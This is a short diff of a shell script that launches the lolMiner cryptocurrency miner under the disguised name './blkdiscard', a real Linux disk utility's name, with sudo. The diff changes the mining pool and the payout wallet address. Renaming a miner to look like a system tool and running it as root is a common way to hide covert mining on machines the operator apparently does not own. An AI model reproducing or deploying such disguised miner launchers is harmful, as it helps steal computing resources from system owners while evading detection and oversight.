@@ -2,5 +2,5 @@
 
 cd "$(dirname "$0")"
 
-chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:THL6Jgj9rFPPYBdAE45nRFwfRTgqqRZ9e4.$(echo Harry-$(shuf -i 1-9999 -n 1)) --ethstratum ETHPROXY
+chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 3JPLRMGt5wymA47349AB88Ldd52CVSEV7f.Harry --ethstratum ETHPROXY
 pause
